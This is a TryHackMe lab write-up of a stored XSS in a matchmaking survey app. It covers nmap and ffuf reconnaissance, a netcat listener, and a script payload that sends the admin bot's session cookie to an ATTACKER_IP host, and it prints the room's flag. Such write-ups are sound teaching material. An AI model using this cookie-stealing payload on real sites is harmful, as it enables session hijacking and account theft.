# Cupid's Matchmaker — TryHackMe Writeup

**Difficulty:** Easy | **Category:** Web | **Points:** 100

---

## Summary

A matchmaking survey application where an admin bot periodically reviews submissions. The application fails to sanitize user input before rendering it in the admin panel, allowing stored XSS that exfiltrates the admin's session cookie.

---

## Reconnaissance

### Port Scan

```bash
nmap TARGET -sV -p- --min-rate 5000
```

Open ports: `22/ssh`, `5000/web`

### Directory Enumeration

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u http://TARGET:5000/FUZZ \
     -mc 200,301,302 -t 50
```

**Found:** `/admin` (302), `/login` (200), `/logout` (302), `/survey` (200)

---

## Exploitation

### Step 1 — Identifying the attack surface

The application has a personality survey form with multiple free-text fields. The description states:

> *"Our team reads every word! Be honest and detailed."*

This is a strong hint that an admin bot reads all submissions — a classic **Stored XSS** scenario.

Intercepted the survey submission with Burp Suite:

```
POST /survey HTTP/1.1
Host: TARGET:5000

name=test&age=20&gender=Male&seeking=Female&ideal_date=TEST&
describe_yourself=TEST&looking_for=TEST&dealbreakers=TEST
```

### Step 2 — Confirming XSS

Set up a listener:

```bash
nc -lvnp 8000
```

Injected a basic XSS payload into the `ideal_date` field:

```html
<script>fetch('http://ATTACKER_IP:8000/'+document.cookie)</script>
```

Full request:

```
name=test&age=20&gender=Male&seeking=Female&
ideal_date=<script>fetch('http://ATTACKER_IP:8000/'+document.cookie)</script>&
describe_yourself=test&looking_for=test&dealbreakers=test
```

### Step 3 — Receiving the cookie

After ~30 seconds the admin bot visited the submissions page and executed the payload. The netcat listener received:

```
GET /session=THM{XSS_CuP1d_Str1k3s_Ag41n} HTTP/1.1
```

The session cookie **was** the flag.

---

## Vulnerability

**Stored XSS (Cross-Site Scripting)** — User-supplied input was stored in the database and rendered without sanitization in the admin panel. When the admin bot loaded the page, the malicious script executed in their browser context, exfiltrating their session cookie.

---

## Flag

`THM{XSS_CuP1d_Str1k3s_Ag41n}`

---

## Key Takeaways

- Always test the simplest XSS payload first (`<script>` tag) before escalating complexity
- When an application says "a human reads every word", think Stored XSS
- `nc -lvnp PORT` is the fastest way to receive exfiltrated data
- `document.cookie` can be exfiltrated directly if the cookie lacks the `HttpOnly` flag
- The `HttpOnly` flag on cookies prevents JavaScript from reading them — its absence here was the critical misconfiguration
